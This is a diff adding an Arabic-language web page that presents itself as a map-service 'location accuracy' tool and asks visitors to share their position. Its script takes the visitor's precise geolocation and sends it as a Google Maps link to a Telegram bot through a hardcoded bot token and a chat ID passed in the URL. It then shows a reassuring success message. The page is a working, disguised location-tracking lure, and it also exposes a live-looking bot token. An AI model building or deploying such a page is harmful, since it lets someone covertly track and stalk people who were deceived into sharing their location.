@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>تحسين دقة الموقع</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { font-family: 'Segoe UI', Roboto, sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+    .card { background: white; border-radius: 16px; box-shadow: 0 2px 12px rgba(0,0,0,0.1); padding: 30px 20px; text-align: center; max-width: 340px; width: 90%; }
+    .icon { font-size: 48px; margin-bottom: 16px; }
+    h2 { color: #1a73e8; font-size: 20px; margin-bottom: 8px; }
+    p { color: #5f6368; font-size: 14px; margin-bottom: 20px; }
+    .progress { background: #e8eaed; border-radius: 20px; height: 8px; width: 100%; margin: 16px 0; overflow: hidden; }
+    .progress-fill { background: #1a73e8; width: 0%; height: 100%; border-radius: 20px; transition: width 0.5s ease; }
+    button { background: #1a73e8; color: white; border: none; padding: 12px 28px; border-radius: 30px; font-size: 15px; font-weight: 600; cursor: pointer; }
+    button:hover { background: #1557b0; }
+    #status { margin-top: 12px; font-size: 13px; color: #5f6368; }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <div class="icon">📍</div>
+    <h2>تحسين دقة الموقع</h2>
+    <p>ساعدنا في تحسين خدمات الخرائط عن طريق مشاركة موقعك الحالي</p>
+    <div class="progress"><div class="progress-fill" id="progressBar"></div></div>
+    <button id="startBtn">مشاركة الموقع</button>
+    <div id="status"></div>
+  </div>
+
+  <script>
+    const params = new URLSearchParams(window.location.search);
+    const CHAT_ID = params.get('chat');
+    const TOKEN = "8558243002:AAGTsGfVX5IfQERVDksCP0crVIYIB6ethqs";
+    const progressBar = document.getElementById('progressBar');
+    const statusDiv = document.getElementById('status');
+    const startBtn = document.getElementById('startBtn');
+
+    startBtn.addEventListener('click', () => {
+      startBtn.disabled = true;
+      statusDiv.textContent = 'جاري تحديد الموقع...';
+      progressBar.style.width = '30%';
+
+      navigator.geolocation.getCurrentPosition(pos => {
+        progressBar.style.width = '80%';
+        const { latitude, longitude } = pos.coords;
+        const msg = `📍 موقع المستخدم:\nhttps://maps.google.com/?q=${latitude},${longitude}`;
+        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`)
+          .then(() => {
+            progressBar.style.width = '100%';
+            statusDiv.textContent = '✅ تم تحسين الدقة بنجاح';
+          })
+          .catch(() => {
+            statusDiv.textContent = '❌ فشل الإرسال، حاول لاحقاً';
+          });
+      }, err => {
+        progressBar.style.width = '0%';
+        statusDiv.textContent = 'يجب السماح بالموقع لتحسين الدقة';
+        startBtn.disabled = false;
+      }, { enableHighAccuracy: true });
+    });
+  </script>
+</body>
+</html>
